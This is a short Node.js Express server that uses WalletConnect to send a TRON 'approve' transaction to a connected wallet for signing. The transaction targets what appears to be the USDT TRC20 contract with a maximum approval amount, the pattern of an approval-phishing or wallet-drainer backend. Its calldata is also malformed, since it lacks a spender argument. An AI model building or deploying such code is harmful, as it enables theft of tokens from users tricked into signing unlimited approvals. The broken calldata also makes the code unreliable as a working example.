import express from "express";
import cors from "cors";
import SignClient from "@walletconnect/sign-client";

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static("public"));

const projectId = "de40497ce192a97e53c3da7d3f1a4e89";

let client;
let sessions = {};

// INIT
async function init() {
  client = await SignClient.init({
    projectId,
    metadata: {
      name: "TRON Backend",
      description: "WalletConnect Relay",
      url: "http://localhost:3000",
      icons: []
    }
  });

  console.log("WalletConnect Client Ready ✅");

  client.on("session_update", (session) => {
    sessions[session.topic] = session;
  });

  client.on("session_delete", (session) => {
    delete sessions[session.topic];
  });
}

await init();

// =====================
// TRON APPROVE API
// =====================
app.post("/approve", async (req, res) => {
  try {

    const { topic, address } = req.body;

    const tx = {
      raw_data: {
        contract: [
          {
            parameter: {
              value: {
                owner_address: address,
                contract_address:
                  "41a614f803b6fd780986a42c78ec9c7f77e6ded13c",
                data:
                  "095ea7b3ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
              },
              type_url:
                "type.googleapis.com/protocol.TriggerSmartContract"
            },
            type: "TriggerSmartContract"
          }
        ]
      }
    };

    await client.request({
      topic,
      chainId: "tron:0x2b6653dc",
      request: {
        method: "tron_signTransaction",
        params: tx
      }
    });

    res.json({ success: true });

  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// =====================
// START SERVER
// =====================
app.listen(3000, () => {
  console.log("Server running on http://localhost:3000 🚀");
});